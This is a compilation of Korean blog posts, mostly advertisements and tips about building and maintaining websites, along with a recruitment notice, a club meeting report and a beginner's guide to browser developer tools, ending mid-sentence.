품질의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와드립니다!​업체의 상품과 서비스를 완벽하게 분석해 더 보기 쉽게, 더 흥미가 일도록 만들어드리는 곳!인스타그램 등 SNS를 활용한 다양한 광고 마케팅도 시행하여 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 부담 낮은 견적으로 고객님의 마케팅 비용은 낮춰주고!신속 정확한 일처리 및 원활한 피드백으로 홈페이지 제작 및 만족도는 높여주고!​지금 메이크홈즈에 문의하셔서 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!   노력하는 사람이 아름답다는 말은 곧 오늘 땀방울이 더 훌륭한 내일을 만든다는 말일 것인데요.홈페이지 제작 및 관리에 대한 정보를 열심히 익히는 여러분의 모습이 빛나는 까닭이겠지요? 멋진 내일을 위해 힘차게 달려가는 여러분을 응원하며 더 좋은 포스팅으로 만나볼게요!​​​​​   네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지유지보수 관리가 생명  온라인상에서 브랜드와 기업의 첫인상을 결정해주는 홈페이지! 여러분의 홈페이지는 어떤 모습인가요?홈페이지 구축은 성공적인 사업의 첫 시작일뿐 구축완료부터가 무엇보다 중요한데요!계속 업데이트 되지 않고 트렌드에 뒤떨어져있는 디자인이라면 과연 계속 그 홈페이지를 방문하고 싶은 마음이 생길까요? 그래서 오늘은 강조해도 지나치지 않는 홈페이지유지보수에 대해서 다시 한번 이야기를 해보려고해요~   잘 만들어진 홈페이지라도 시간이 지나도록 그대로 머물러있고 계속 관리되지 않는다면자칫 무용지물로 남을 수 있는데요!   그만큼 꾸준한 관리가 중요한 홈페이지!그럼 홈페이지유지보수는 어떤 과정으로진행되는지 지금부터 한번 살펴볼까요?   홈페이지유지보수는 크게 두가지로 나뉘어 볼 수 있답니다! 약정 유지보수와 건별 유지보수로 나뉘어 볼 수 있는데요!약정유지보수는 매월, 1년 단위 계약을 통해  안정적으로 운영이  가능한 게 가장 큰 장점이랍니다!    건벌 유지보수는 호스팅 서비스만 그대로 유지하고 필요하면 그때그때  업무요청 건에 따라 처리하는 유지보수 형태랍니다!어떻게 보면 비용이 적게 들어갈 것 같지만 계속 홈페이지가 업데이트 되면 그때마다  비용이 발생하게 되죠   그래서 정기적으로 꾸준히 업데이트를 하려면 약정 유지보수 계약이 훨씬 유리한데요! 홈페이지를 관리할 전문인력이 없어도 홈페이지 수정 사항이 있을 때마다  즉각적으로 반영할 수 있기 때문에 인건비도 줄일 수 있게 됩니다!특히 약정유지보수는 안정적이고 빠른 업무처리가 가능하다다는 것이 무엇보다 큰 장점입니다!   10억홈피에서는 홈페이지 제작만 진행하고 끝나는 게 아니라 1년동안 무상 홈페이지유지보수 서비스를 제공하고 있는데요!   매월 홈페이지 로딩속도, 스팸, 오류에 대한 정기점검을 진행할 뿐만 아니라 도메인, 서비스만료, 시스템 점검을 중단하지 않고 계속 진행해드리고 있습니다!   홈페이지별로 각 담당자를 배정해 원활한 커뮤니케이션을 유지하고 있어요!홈페이지 유지보수 서비스를 계속 유지하시면  대표도메인 또한 무료로 연장해드리고 있답니다!   고객과의 소통을 중요시하는 10억홈피에서 합리적인 비용으로 효율성 있고안정적으로 홈페이지유지보수 해보세요! Previous imageNext image ▼▼유지보수 보러가기▼▼   ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가코로나19로 인한 지속된 집합금지 여파로 최근에 세미나실 사업장 하나를 폐업하면서 시간적 여유가 생기는 바람에 저의 프로필 홈페이지를 오랜만에 업그레이드 개발했습니다. 아무래도 저처럼 1인지식기업에게는 퍼스널브랜딩이 무엇보다 중요하기 때문인데요.특히 요즘같은 비대면시대에 온라인 프로필은 인적교류를 위한 명함을 대체할 수 있을 것 같습니다.​낭만사업가 정대표의 프로필 홈페이지http://matew.com/ 낭만사업가 휴먼링커 정대표인천검단에서 1인가구와 1인기업을 위한 홈오피스형 공유주택을 운영하고 있으며, 컴퓨터활용 비대면 개인레슨과 홈페이지 개발 및 IT컨설팅으로 소소하게 경제적자유를 꿈꾸며 살고 있습니다.: #낭만사업가 #휴먼링커 #정대표 #인천 #검단 #공유주택 #공유사무실 #집무실 #코워킹스페이스 #홈페이지개발 #컴퓨터활용 #개인레슨matew.com 요즘에 재능마켓 숨고와 크몽에서 저의 프로필을 등록해서 일거리를 조금씩 받아서 하고 있는데역시나 여기도 경쟁이 치열해서 쉽지는 않네요. ㅠㅠ저는 재능마켓에서 저의 주특기인 엑셀 파워포인트와 같은 컴퓨터활용능력과 웹개발 코딩기초 그리고 쉐어하우스 창업 및 부동산 재태크 개인레슨을 해주고 있고 간단한 기업홈페이지와 개인 프로필 홈페이지를 개발해 주는 일을 받아서 하고 있습니다.그래서 저의 프로필을 업데이트하면서 개인 프로필 홈페이지도 업그레이드 한거죠^^​그래서 저처럼 1인지식기업이신 분들에게 자신을 효과적으로 PR할 수 있는 개인 프로필 홈페이지를 부담되지 않고 합리적인 비용(30만원, 부가세별도)으로 개발해 드리려고 합니다.또한 서버호스팅 비용도 절감할 수 있게 제가 이용하고 있는 서버에 탑재해서  원하시는 분들에 한해서 연회비(10만원)으로 관리도 해드겠습니다.필요하신 분이 계시다면 편하게 문의주세요~ ​문의하기전화상담: 070-8955-9162이메일상담: 07089559162@open-learn.net채팅상담: https://open.kakao.com/me/humanlinker  #1인지식기업 #1인기업 #프로필 #홈페이지 #퍼스널브랜딩 #개인홈페이지 #오픈런하우스 #공유사무실 #공유오피스 네이버 블로그는 맞지만, 확인불가우리레오PMC 홈페이지 리뉴얼 오픈​​안녕하세요. 레옹이 입니다.   오늘은 우리레오PMC 홈페이지 리뉴얼 소식을 전해드리려고 합니다.4월 14일, 우리레오PMC  새 홈페이지가 오픈하였는데요~​​​​http://www.woorileopmc.com/​​​​이번 홈페이지 리뉴얼은​​​기존 홈페이지 보다 우리레오PMC 제공 서비스에 대해 보다 자세하게 나타냈으며입주자 전용페이지 설치, 공실안내, 협력 중개업소 신청, 세미나 사전신청 등의 기능을 강화하여 홈페이지를 자주 이용하시는 분들의 편의성을 고려하였습니다.​​​  우선 홈페이지 메인 입니다. '성공하는 주택임대관리 우리레오PMC가 전문입니다.' 라는 문구가 눈에 띄네요.​​       [24시간 문의] 우리레오PMC 관리건물 입주자께서는 홈페이지를 통해 언제 어디서나 '24시간 문의'를 하실 수 있습니다.     ​ [입주초기 하자신고] 우리레오PMC 관리건물에 입주 후, 혹시나 우리레오가 발견하지 못한 하자가 있을 때 편리하게 하자신고를 할 수 있는 기능을 넣었습니다.​​      [퇴실접수]퇴실을 희망하는 입주자가 홈페이지를 통해 접수할 수 있는 기능도 추가하였습니다.​​      [협력 중개업소 신청]우리레오PMC와 협업을 원하시는 중개업소에서쉽게 신청하실 수 있도록 '협력 중개업소 신청'페이지도 만들었습니다.​​      [세미나 사전등록]우리레오PMC는 주택임대사업자를 대상으로 정기적으로 세미나를 개최하고 있는데요.이제는 '세미나 사전등록'페이지를 통해 쉽게 신청하실 수 있습니다 ~​​ ​홈페이지를 자세히 구경하고 싶으시다면​아래링크를 클릭해주세요.​http://www.woorileopmc.com/​​​레옹이가 공들여서 제작한우리레오PMC 새로운 홈페이지 마니마니 사랑해주세요 'ㅁ'​​​​​​​-------------------- 기업형 주택임대관리회사 우리레오PMC --------------------​​​네이버 블로그는 맞지만, 확인불가홈페이지관리 알고나면 가격거품덩어리?홈페이지를 제작하는것도 너무 중요하지만무엇보다 더 중요한것은 추후홈페이지관리에 대한 부분인데요-하지만 홈/페/이/제/관/리/를잘못 맡기게 되면 거품덩어리에휘말릴 수 있다는 사실!타 업체에서는 홈페이지관리에 대한 부분을직접적으로 하는 것 보다개인 프리랜서들에게 의뢰를 해저렴한 인건비 대비 비싼 가격거품을 잔뜩 씌워이득을 보고 있는것이 현실입니다.거.품.이.잔.뜩.낀 업체를 잘못 만나필요 이상의 돈을 지불하고 계셨다면오늘의 포스팅에 주목해 주세요.온디자인에서는 체계적인 시스템을 갖춘전문 홈페이지관리 / 제작 업체로써1:1 개인시스템으로 관리가 되며문제가 생길 시 그즉시 해결해 드릴 수 있는전문업체입니다.앞서 말씀드렸듯 타 업체에서는인건비 절약을 위해개인프리랜서를 고용해 진행하는경우가 많다고 했는데요-그러다보니 홈페이지관리부분이잘 되지 않고 있는것이 실정입니다.계약 후 홈-페-이-지 제작을 하고도홈페이지관리팀이별도로 구성되어 있지 않아계속적으로 진행할 자본이나여력이 부족하기 때문입니다.온디자인에서는 회사 자체 내에서체계적인 시스템을 통해빠른 홈-페-이-지 제작과홈페이지관리가 완벽하게 진행되고 있습니다.프리랜서? 아닙니다온디자인 소속 전문가집단들의노하우를 모아모아 전문적으로 진행합니다.타 업체에서는 건수를 늘리기 위한 부분에만포커스를 맞춰 홈페이지관리 시소통의 부재를 느낄 수 밖에 없는데요-저희 온디자인에서는 홈페이지관리 시지속적인 진행상황에 대한 관리커뮤니케이션이이루어지고 있으며홈페이지제작 시 도메인과 호스팅등록비용을무료로 해 드리고 있습니다 :)홈.페.이.지.관.리 라는 명목하에현재 진행상황을 전혀 파악하지 못하거나제대로된 관리가 이루어지지 않는 업체가생각보다 너무나 많습니다.그렇기 때문에 더 신중히 결정하셔야 합니다.홈페이지관리 시 유지보수 추가비용이부담스러우시다구요?그래서 관.리.를 맡기기가 꺼려지신다구요~?!타 업체에서는 유.지.보.수 시에도수정이라는 명목하에 10만원에서 많게는20만원까지 요구해 수정을 해주는경우도 많습니다.그렇지만 저희 온디자인에서는홈페이지관리 , 제작 시 1년동안 진행되는하자보수비용에 대해서는전면 무료로 처리를 도와드리고 있습니다.저희 온디자인에서는전문인력으로만 구성되어 있어별도의 기획이 필요 없이홈페이지제작이 무려 2주만에 가능하며홈페이지관리 시에도 하자보수팀이별도로 구성되어 있어"아 이것이 진정 컴플레인없는 진짜전문홈페이지제작업체구나"라는 것을 느끼실 수 있으실겁니다!업계 최저가로 진행됨을 약속드리며미팅 시 비용은 더욱 저렴해 질 수 있다는꿀팁까지!시간이 지나 홈페이지를 새롭게 리뉴얼하고자 할때!홈페이지관리를 아무걱정없이업계 최저가로 저렴하게 맡기고 싶을 때!그 누구보다 빠른 제작완성을 원할때!컴플레인 없는 진짜 전문홈페이지 제작업체온디자인에서 지금바로 확인해보세요!   ﻿ 해양환경관리공단에서 2014년 제 1차 홈페이지 모니터링 요원을 모집합니다! "푸른 해양의 미래가치를 창조하는 국민기업" 해양환경관리공단은, 2013년부터 홈페이지 모니터링 요원을 운영해왔습니다. 여러분의 의견을 듣고, 여러분이 원하는 방향으로, 여러분과 함께 만들어나가는 홈페이지가 해양환경관리공단의 목표입니다!그럼 본격적으로 해양환경관리공단 홈페이지 모니터링 요원으로 선발되기 위한 과정을 살펴볼까요?      이번 해양환경관리공단 홈페이지 모니터링 요원의 경우, 12개월 동안 활동했던 지난 2013년과는 다르게 1,2차수로 나눠서 각각 5개월씩 활동을 하게 됩니다. 활동 기간을 짧고 임펙트있게 운영하기 위해서 입니다 :)그럼 모집 개요를 살펴보도록 할까요?   1. 모집개요      ❍ 모집인원 : 0명          ※ 신청자가 기준에 부합되지 않을 때에는 모집 인원이 변경될 수 있습니다.     ❍ 접수기간 : 2014년 1월 29일(수) ~ 2월 19일(수)        - 2014년 2월 21일(금) 공단 홈페이지에 합격자 발표 및 이메일/유선 개별통지     ❍ 신청자격       - 해양환경 및 해양환경관리공단에 관심이 있는 일반국민       - 공단 홈페이지 이용이 가능한 분     ❍ 우대자격       - 웹사이트 전문가(해양/환경 관련 분야) 또는 운영 유경험자       - 티 기관 및 공단 홈페이지 모니터링 경험자       - 파워블로거 및 SNS 운영 능력이 탁월한 자     ❍ 접수방법 : 신청서 작성 후 이메일(koempr@koem.or.kr)로 제출  2. 모니터링 요원 활동       ❍ 활동기간 : 2014년 2월 ~ 6월 (5개월)     ❍ 활동내용 : 월 1회(매월 25일) 모니터링 결과보고서 제출       - 홈페이지 개선방안 제시       - 홈페이지 주요정보 및 최신자료 관리실태 파악       - 콘텐츠 내용 및 오·탈자 지적       - 블로그, SNS 등을 통한 공단 홍보활동         ※ 매월 초 제시되는 가이드라인에 맞춰 모니터링 보고서 작성.(보고서 양식 제공)         ※ 모니터링 요원 합격 시 제출한 신청서는 1월 결과보고서로 인정     ❍ 모니터링 범위 : 공단 메인홈페이지 및 분임홈페이지     ❍ 활동혜택       - 월별 보고서 제출 시 음료이용권 지급       - 수료자 전원에게 소정의 활동비 지급(단, 수료확정 이후)       - 해양환경관리공단 이사장 명의의 활동 수료증 발급     ❍ 수료기준       - 5회 이상 월별보고서 제출         ※단, 제출기한 미준수 및 보고서내용이 불성실한 경우 수료가 취소될 수 있음   앗, 제 눈에는 매달 결과보고서를 제출하면 음료이용권 기프티콘이 날아온다는 점과!해양환경관리공단 이사장님 명의의 활동 수료증이 발급된 다는 것이 가장 부각됩니다!!또 수료가 확정되면 소정의 활동비도 받을 수가 있으니~ 매달 꼬박꼬박 보고서를 잘 제출해야겠습니다 ^^    그럼 해양환경관리공단 홈페이지 모니터링요원 활동 혜택과 수료기준을 더 자세히 알아보겠습니다!  1. 활동 혜택 및 수료기준    ❍ 활동혜택  - 월별 보고서 제출시 음료이용권 제공  - 수료자 전원에게 소정의 활동비 지급(단, 수료확정 이후)  - 해양환경관리공단 이사장 명의의 활동 수료증 발급    ❍ 수료기준  - 5회 이상 월별보고서 제출자에 한함  - 단, 제출기한 미준수 및 보고서 내용이 불성실한 경우 수료가 취소될 수 있음   구분내용보상비고월별월 보고서 제출자매월 음료이용권 지급기프티콘 발송활동비수료자 전원수료시 5만원 지급온누리상품권수료시최우수활동자 1인 우수활동자 2인최우수 활동자 5만원우수활동자 각 3만원        모두모두 내용 숙지는 되셨는지요~?!그럼 다 같이 해양환경관리공단 홈페이지 모니터링 요원을 신청하러 고고씽 해볼까요? 고! 고! 씽~!   해양환경관리공단 홈페이지 모니터링 요원 모집공고 바로가기 ▼http://www.koem.or.kr/guide/notice.jsp?job=VIEW&section=notice&seqno=42844&tab=0          [중장비학원] 홈페이지제작및관리, 알고싶다면 얼른 클릭하세요 홈페이지 제작 업체 선정, 철저하게 알아보자!    어떤 것을 100% 이해했다고 생각했을 때각도를 약간만 돌려 보면 전혀 몰랐던 새로운 모습을 보게 됩니다.    실상 알고 있는 몇 가지에 사로 잡혀  지나치고 있는 것들이 많죠. 그럼 지금부터 홈페이지제작및관리에 대한 유용한 정보 알려드릴게요!    홈페이지 제작은 홈페이지 전문 디자이너부터 홈페이지 기획자, 설계자, 개발자까지 다방면의 분야에서의 전문가들이 협력하는 작업인데요.    홈페이지 관리 업체를 선택할 때에는 필요할 때마다 유지 보수가 진행되는지,  전문 인력이 있는지, 회사가 튼튼한 기반으로 운영되고 있는지 확인해야 합니다.        그리고 텍스트, 이미지, 플래시, 프로그램 등 상품 별로 관리나 수정 횟수가 유형에 따라 다른지 확인하고 홈페이지 전문업체를 선정하는 것도 바람직한데요.     값싸게 홈페이지를 제작해 주는 업체 가운데는, 홈페이지 관리가 꼼꼼하지 못할 뿐 아니라 홈페이지 내용의 신규 추가 요청 시 추가 결제를 제시하는 경우도 있음을 꼭 기억해두세요.        참고로 홈페이지를 제작할 경우, 업체에 일방적으로 권한을 넘기는 것보다 자신의 아이디어와 바라는 부분을 이야기하고 제작부터 기획까지 전반을 함께 논의해야 결과물 만족도가 높습니다.     당신의 선택에 더욱 필요한 홈페이지 플래시 대한 정보    최근에는 정적인 홈페이지보다 동적인 홈페이지에 관한 관심도가 높아지고 있습니다.예를 들면 기존 스크롤 형식이 아니고 한 페이지 내에서 전부다 컨텐츠를 보여준 다음 마우스로 원하는 메뉴를 클릭하면 그 컨텐츠로 이동하는 방식을 흔히 사용하고 있습니다.        이렇게 홈페이지의 움직임을 연출하게 만들어주는 프로그램이 바로 플래시입니다. 즉 플래시를 적절히 활용한다면 더욱 다양한 디자인의 홈페이지를 계획할 수 있습니다.     그러나 홈페이지 화면을 만들 때 무작정 이미지나 동영상을 넣게 되면, 화면은 화려해 질 수 있으나 오히려 산만한 분위기가 될 수 있으니 조심해야 해요.사실 플래시로 인터넷을 만든다고 해서 무조건 동적인 디자인만 허용되는 것은 아닌데요.정적이고 깔끔한 디자인도 가능하니, 플래시를 이용해 고퀄리티의 디자인을 구현해보세요.        참고로 홈페이지를 동적으로 만들어 주는 프로그램으로는 플래시 외에도 자바 스크립트가 있습니다.자바스크립트는  마우스를 올렸을 때 글자 색깔이 바뀌는 것과 같이 이벤트 지향적인 성격을 가집니다.        철저히 교육생 중심으로 관리하는 중장비 면허학원 찾는다면?         꿈을 성취하는 첫걸음을 자신 있게 내딛게 도와드리는 김해중장비학원을 소개할게요.       20년 전통의 노련한 강사진과의 1:1 맞춤교육,편리하고 이질감 없는 새로운 장비는 기본!장거리 교육생을 위한 신식 기숙사 완비! 365일 연중무휴 교육합니다.타워크레인, 3톤 미만 굴삭기, 지게차, 유압식 기중기, 록드릴, 로더, 롤러, 불도저, 천장크레인, 컨테이너 크레인 등 전국에서 가장 많은 종류의 중장비 면허증 교육!  15가지 면허를 발 빠르게 취득해보세요!       자체 시험장 지정 OK! 김해중장비학원! 교육문의 >> 055 - 335 - 8778경상남도 김해시 유하로 475에 위치하고 있는 김해중장비학원으로 망설이지 말고 찾아오세요!    삶이란 행운을 기다리는 것이 아니라 불행을 헤쳐나가는 것이라고 합니다.이처럼 그냥 지켜보기보다는 여기저기 부딪혀 처한 상황을 해결해 나가는 것이 중요하죠.홈페이지제작및관리 관련 정보를 통해 하루를 알차게 보냈나요?    여러분의 앞날에 도움이 되도록 이 다음 시간에도 유용한 정보만 골라서 찾아올게요! ​​네이버 블로그는 맞지만, 확인불가안녕하세요! 오늘도 인사드립니다. 홈페이지 통합관리 업체 오픈컴입니다. ​​  ​​오늘은 도메인 통합관리에 대하여 이야기 해보려 합니다.​​ ​​앞서 홈페이지 제작의 기본: ① 도메인https://blog.naver.com/opencomblog/221934075493포스팅 글에서도 이야기에서도도메인에 중요성에 대해 설명드린 적이 있는대요!​​홈페이지 제작 시 반드시 필요한  필수 주소인 만큼중요성을 강조해도 지나치지 않는데요​​ ​​여기서 말하는 도메인(domain)이란?도메인 네임 (Domain name)으로​​식별하기 어려운 IP주소 (ex: 211.08.123.1)을naver.com 처럼 방문자가 기억하기 쉽게 만들어 주는 네트워크 호스팅 네임을 말합니다.​​ ​​대한민국의 경우 .kr이라는 ccTLD를 부여받아​​ KRNIC -> 실직적으로는 한국인터넷진흥원 인터넷주소센터에서 관리하고 있습니다. ​​ ​​하지만 홈페이지제작에서부터도메인구매 웹호스팅 까지관리하시기 너무 번거로우실텐데요!​​저희 오픈컴은 22년간홈페이지 도메인 서비스 뿐 아니라홈페이지호스팅/ 홈페이지제작/ 보안서버인증서/부가서비스홈페이지와 관련된 모든 요소를통합관리하여 서비스 하고 있습니다.​​ ​​도메인 신규등록 및 기관이전에 대하여40% 파격적인 할인 이벤트도 진행중이니 아래 오픈컴 웹사이트 바로가기 아이콘을 눌러 확인 가능하답니다^^​​​ ▲ CLICK 시 오픈컴 웹사이트로 이동합니다.​​​​ HOMEPAGE의 모든것! 통합관리가 가능한 오픈컴에 문의하세요. ​​빠른문의는​ (tel. 1544-4256)​바로 전화주세요!​​  ​   [추천정보] 홈페이지 제작 및 관리홈페이지 부가서비스, 현명하게 사용하세요!안녕하세요. 여러분~ 홈페이지제작및관리에 필요한 정보를 가져온 블로그 지기입니다.누구나 읽으면 만족할만한! 가장 필요로 하는 정보만 담아 왔으니까요.꼭 깜박하지 말고 꼼꼼히 읽어주세요~맞춤형 홈페이지는 인건비가 따로 발생하기 때문에 솔루션형보다 값이 비싸요,하지만 필요한 기능을 따로 개발해주고, 전문적인 유지 보수를 해줘서 좋습니다.반면 공통 디자인, 저용량 호스팅으로 저렴하게 이용하시려면 솔루션형을 권장합니다.기본적인 솔루션형 홈페이지의 경우 저렴한 금액으로 제작할 수 있어요.하지만 디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 적합한 홈페이지 관리가 필요하겠죠.특히 지속적인 관리가 필요한 경우, 맞춤형 서비스를 사용하여 보는 건 어떨까요?특히 로그분석 프로그램은 많이 사용되 부가서비스입니다.홈페이지 방문자의 행태와 경로, 접속한 페이지 등을 조사하는 방법이랍니다.로그분석을 통해 방문자 수, 웹 페이지별 방문 횟수 등의 유용한 자료를 알 수 있기 때문이죠.로그 분석의 자료는 운영 방향, 마케팅 플랜을 수립하는 데 큰 도움이 됩니다. 특히 로그분석에 활용되는 액세스로그는 잘 활용하면 아주 유용해요.액세스로그란 홈페이지 방문객들이 홈페이지에서 요청했던 파일들을 기록한 리스트입니다.이를 분석하여 타겟층의 흥미를 파악할 수 있습니다. 홈페이지 제작 및 관리 대행업 업체의 서비스, 철저히 파헤쳐 보자!홈페이지 제작 및 관리 대행업체에 작업을 요청하면 먼저 도메인을 제공해 줍니다.도메인은 홈페이지의 고유 주소로, 연간 단위로 일정 금액을 지불해 사용합니다.또한 대행 업체는 호스팅 서비스도 제공한답니다.호스팅 서비스는 홈페이지를 관리하고 운영할 수 있도록 해 주는 서비스지요.무엇보다 중요한 게 안전인데요.대행 업체는 보안서버 인증서 설치도 대신 해 주죠.덕분에 완성된 홈페이지의 보안이 강화되고 안전하게 유지될 수 있어요.개인정보보호법이 강화되면서 사이트 내에 주민등록번호나 마킹작업이 요구되기도 합니다.편리하고 안전히 홈페이지 운영을 할 수 있도록 해준답니다.홈페이지 제작 관리 대행업체에서는 이런 정보 보안 서비스를 제공하니까 안심하세요. 홈페이지를 운영하다 보면 알 수 없는 장애나 문제점이 발생할 수 있어요.홈페이지 제작 및 관리 대행 업체에서는 24시간 항상 이런 장애를 접수 받아요.언제나 신속하게 처리할 수 있는 서비스를 제공하고 있기에 안심이에요. 고급스러운 홈페이지 제작으로 가성비 최고의 효과를 내기 원하는 분에게18년의 오랜 경력을 갖춘 드림인터페이스를 적극 추천합니다. 드림인터페이스는 홈페이지/모바일 홈페이지/쇼핑몰 고급 맞춤형 제작회사에요.풍부한 실무 경험을 가진 개발진과 디자이너가 직접높은 퀄리티로 제작하며, 여러 요구사항까지 적극 반영해 드립니다! 업체 홈페이지 제작 또는 홈페이지 개편이 필요한 시점이라면합리적인 견적을 제시하는 드림인터페이스에 문의해보세요!과거와 현재, 미래 중 이웃님이 가장 중요하게 고려하는 것은 무엇인가요?저는 현재의 바로 이 순간이라고 생각해요. 오늘이 쌓여 먼 미래가 되는 거니까요!오늘 배운 홈페이지제작및관리에 대한 소식으로 더 나은 내일을 만들어 보세요~! 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가이전 포스팅에서 링크 거는 방법을 알아봤는데요이번에는 링크를 걸고 싶은 위치를 찾아가는 방법에 대해서 알아보겠습니다."관리자 도구"﻿  * 크롬에서 하시길 추천합니다.﻿크롬 설정에 보시면 하단에 도구 더보기 아래에 관리자 도구라는 매뉴가 있습니다.단축키로는 컨트롤+쉬프트+I 누르시면 됩니다.전문 웹 작업자가 아니더라도 간단한 홈페이지 수정/관리 정도는 일반 분들도 가능하게끔 하는데많은 기여를 하는 좋은 기능입니다.크롬에서 링크를 걸거나 수정할 홈페이지를 뛰우고 관리자 도구를 엽니다보이는 이미지 화면처럼 링크를 걸거나 수정 하고 싶은 텍스트 또는 이미지에 마우스를 가져다 되고 우클릭을 하시면 매뉴에 요소검사라는 매뉴가 있습니다. 클릭!~요소검사를 클릭하시면 보이시는 화면처럼 하단에 위처럼 화면이 바뀝니다.하단 좌측 빨간줄 처럼 해당 요소검사를 한 텍스트나 이미지에 작업된 html 소스가 나옵니다.우측에 빨간 박스는 조금 더 전문적으로 해당 소스에 관련된 다양한 정보를 볼 수 있습니다.* html를 거의 모르는 초급편에 맞춰 최대한 간단한것들만 보겠습니다.정말 좋은 기능들이 많지만 초급자들이 할 수 있는 수준의 간단한 기능들 몇가지만 살펴 볼게요~1. 링크를 걸거나 수정할 위치 확인수정할 파일을 찾았다는 가정하에 해당 파일에서 어느부분에서 링크를 수정해야 할지 찾는데도움이 되겠죠?2. css 파일 위치 찾기우측 박스에 보면 요소검사를 한 해당 요소에 관련 css 정보가 나옵니다.물론 해당 css파일명과 해당 파일이 위치한 폴더 위치까지 나옵니다. 무진장 편리한 기능이죠?3. 폰트 크기나 컬러 등등 변경 내역 실시간 확인홈페이지 링크외에 폰트 수정같은 기본적인 수정을 할때 우측 박스 부분에서 폰트을 원하는 타입으로수정해보면 실시간으로 수정된 내용을 바로 확인해 보실 수 있습니다.* 조금 응용해서 폰트 외에도 이미지 교체같은 간단한 경우에도 FTP에 교체할 이미지를 올려놓고해당 좌측 화면에서 올려놓은 이미지명으로 교체하면 실시간으로 교체된 이미지로바로 확인도 가능합니다. =====================================================================================﻿관리자 도구를 활용할 수 있는건 정말 많은데 링크나 폰트 수정, 이미지 교체 같은 웹작업자가 아니여도가능한 작업 시 필요한 몇가지 살펴보왔고 이후에는좀 더 고급 기능을 함 살펴보도록 하겠습니다.^^  언제나 즐겁고 유쾌하고 유익한 남양주 스마트 53차 모임 다녀왔어요~이번 53차 모임은 평내도서관 강당에서 있었답니다!정말 많은 남양주스마트 회원분들이 오셨답니다^^즐거운 강의와 함께 남양주 스마트 회원분들과유쾌한 시간 보내고 왔답니다.   남양주 스마트 함용식 단장님의 유익한 강의 시간이 있었답니다!이날 강의때는 블로그 제목의 중요성에 대해 강의해주셨어요.제목을 정할때는 꼭! 사람들이 많이 검색하는 단어로 해야만검색 등에 유리하다는 말씀이 있으셨답니다^^   드림 인터페이스 대표님의 강의도 있었답니다.이분은 싸카 홈페이지를 10년이상 관리해주신 분이라고 합니다.싸카 홈페이지를 과학적이고 체계적으로 관리하여,지금의 싸카가 있게한 장본이시더라구요.     싸카스포츠의 전사 유니폼 강의도 있었답니다.품질 좋고, 원단 좋고, 원하는데로 주문 제작이 가능한전사 유니폼에 대한 강의를  싸카 무니무니 님께서 해주셨답니다.   댓글왕 시상식이 있었답니다!디자인 윤디님께서 댓글왕이 되셔서KT 김종학님께서 선물을 전달해주셨답니다.추카드립니다^^   협업왕 시상식도 있었답니다.체어로 시아이님께서 협업왕 상품으로홍삼세트를 싸카맨님께 선물해주셨답니다.추카추카 드립니당.   신입회원이 5명이나 입회하셨답니다.신입회원분들께 바밤님과 꿈에그린펜션 대표님께서꽃다발을 선물해주셨습니다^^     싸카스포츠의 품질 좋은 전사 유니폼을 입고 기념촬영을 하였답니다.이인희위원장님과 더만족해 함용식 남양주스마트 단장님,김정숙 남양주스마트 총무님 겸 호평동 KT 사모님께서기념촬영을 해주셨답니다. 넘넘 멋지고 이쁘시네요^^​             이날도 풍성한 협찬이 들어왔답니다.싸카스포츠에서 선글라스, 축구공, 스포츠 마사지 크림을 협찬하셨구요,호평동 종로떡전문점에서는 답례품용 떡을 협찬하셨구요,호평동 KT 김정숙 사모님께서 싱싱하고 맛난 딸기를 협찬해주셨답니다.이날 남양주 스마트 53차 모임도 넘넘 알차고 풍요롭게 마무리되었답니다!남양주 스마트 화이팅입니다~~ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가피에스포유를 만난 '순간' 부터 '샵' 매출이 증가됩니다! ﻿ ﻿1. 깐깐하게 관리되는 고객관리차트﻿   - 종이차트를 전자 차트로 사용함으로써, 고객현황을 세밀하게 기록하여 정확한 고객관리가 가능합니다.- 스마트폰으로 외부에서도 예약확인 -자동문자 전송으로 편리한 고객예약 시스템(타사비교 최저가 : 건당20원)﻿﻿  - 고객관리를 좀 더 편하게 해주는 주간예약표 설정 ﻿ ﻿﻿2. ﻿샵 마케팅에 강한 자동 정보분석과 쉽고 빠른 매출조회   ﻿﻿3. LG U+와 기술제휴를 통하여 고객의 전화를 받음과 동시에 ﻿자동으로 고객의 얼굴이 화면에 보여지는 전자차트  ﻿ ﻿﻿﻿4. 샵만의 개성이 돋보이는 맞춤형 (SKIN)﻿홈페이지를 한번의 클릭으로 간단하게 화려한 변신! ﻿  ﻿ ﻿(주)피에스포유 고객관리프로그램 CEM 스마트쌤 홈페이지, 고객관리차트, 자동문자발송, 고객얼굴자동확인, 휴대폰예약을 한방에 완성해주는 프로그램입니다. ﻿네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 홈페이지제작,관리 어떻게 해야 할까?많은 사람들이 쉽게 착각하는 것이 홈페이지 제작만 하면쉽게 고객이 홈페이지로 방문하는 줄 압니다.가게만 열면 고객이 알아서 찾아오겠지라는 생각과 동일합니다.이런 생각을 가지면 잔혹한 현실을 짧게는 수개월, 길게는 수년동안시행착오를 겪어야만 합니다.홈페이지 제작 시 같이 고려할 사항은 바로홈페이지관리와 홈페이지 마케팅입니다.홈페이지만 만들어 놓고 관리를 안한다면죽은 홈페이지가 되는 것이지요 ^^다른 사람들이 찾아와야 나의 좋은상품을 소개하고고객에게 호응을 얻어내어 수익을 창출하죠.대부분의 홈페이지 제작업체들이제작만 해주면 된다는 발상을 가지고 있고의뢰자의 수익부분 및 홈페이지관리에 대해서는의뢰자의 편에 서서 생각을 안합니다.가장 좋은 홈페이지제작 업체는의뢰자의 생각을 읽고 신뢰감 있게 작업해주는 업체가 아닐까요?   잘못된 사례A사장님은 제작 비용을 아낄려고 저렴한곳을 알아보다가 초보 제작자에게 의뢰를 맡겼습니다.초보 제작자는 주먹구구식으로 제작을 하여 납품을 하였고A사장님은 촌스러운 홈페이지를 보고 실망하였지만비용이 저렴하여 OK하고 오픈하였습니다.몇달이 지나도록 방문자는 몇 안되고이미지회사에서 저작권 소송이 걸려왔습니다.A사장님은 당황하여 